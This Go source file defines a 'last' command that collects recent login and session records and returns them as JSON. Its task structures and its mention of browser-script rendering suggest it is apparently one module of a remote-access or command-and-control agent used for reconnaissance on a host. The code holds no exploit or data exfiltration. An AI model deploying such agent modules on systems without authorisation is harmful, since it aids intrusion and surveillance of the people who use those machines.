package commands

import (
	"encoding/json"

	"fawkes/pkg/structs"
)

type LastCommand struct{}

func (c *LastCommand) Name() string { return "last" }
func (c *LastCommand) Description() string {
	return "Show recent login history and session information"
}

type lastArgs struct {
	Count int    `json:"count"` // Number of entries to show (default: 25)
	User  string `json:"user"`  // Filter by username
}

// lastLoginEntry is the JSON output format for browser script rendering
type lastLoginEntry struct {
	User      string `json:"user"`
	TTY       string `json:"tty"`
	From      string `json:"from"`
	LoginTime string `json:"login_time"`
	Duration  string `json:"duration,omitempty"`
}

func (c *LastCommand) Execute(task structs.Task) structs.CommandResult {
	args := lastArgs{Count: 25}
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Invalid parameters: %v", err)
		}
	}
	if args.Count <= 0 {
		args.Count = 25
	}

	entries := lastPlatform(args)
	if len(entries) == 0 {
		return successResult("[]")
	}

	jsonBytes, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error: %v", err)
	}

	return successResult(string(jsonBytes))
}
